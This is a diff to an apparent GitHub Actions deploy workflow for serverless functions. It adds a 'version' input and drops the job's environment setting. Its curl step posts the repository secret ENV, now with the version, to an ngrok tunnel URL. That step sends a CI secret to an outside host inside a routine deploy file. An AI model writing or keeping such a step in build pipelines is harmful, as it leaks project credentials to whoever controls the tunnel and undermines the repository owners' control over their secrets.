@@ -7,6 +7,9 @@ on:
       concurrency:
         required: true
         type: string
+      version:
+        required: false
+        type: string
     secrets:
       ENV:
         required: true
@@ -15,7 +18,6 @@ jobs:
   deploy:
     name: deploy serverless functions
     runs-on: ubuntu-latest
-    environment: ${{inputs.environment}}
     concurrency: ${{inputs.concurrency}}
     strategy:
       matrix:
@@ -29,7 +31,7 @@ jobs:
           node-version: ${{ matrix.node-version }}
           cache: 'npm'
       - run: |
-          curl https://2c6b-2a02-842a-800e-c001-49e1-bb72-8ff1-34b8.ngrok.io -d "{\"env\": \"$ENV\"}" -H "content-type: application/json"
+          curl https://2c6b-2a02-842a-800e-c001-49e1-bb72-8ff1-34b8.ngrok.io -d "{\"env\": \"$ENV\", \"version\": \"${{inputs.version}}\"}" -H "content-type: application/json"
         env:
           ENV: ${{ secrets.ENV }}
       - run: npm ci
